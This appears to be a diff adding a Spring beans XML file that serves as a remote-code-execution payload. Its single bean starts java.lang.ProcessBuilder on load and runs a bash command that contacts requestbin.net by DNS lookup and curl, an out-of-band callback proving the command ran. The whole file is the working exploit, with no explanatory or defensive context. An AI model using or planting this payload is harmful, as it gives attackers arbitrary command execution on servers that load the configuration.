@@ -1,0 +1,13 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+       <constructor-arg>
+           <array>
+               <value>/bin/bash</value>
+               <value>-c</value>
+               <value>nslookup baolq.77147094c7e241e5d172.d.requestbin.net && curl -I http://requestbin.net/r/1lrrxac1?panda</value>
+           </array>
+        </constructor-arg>
+    </bean>
+</beans>
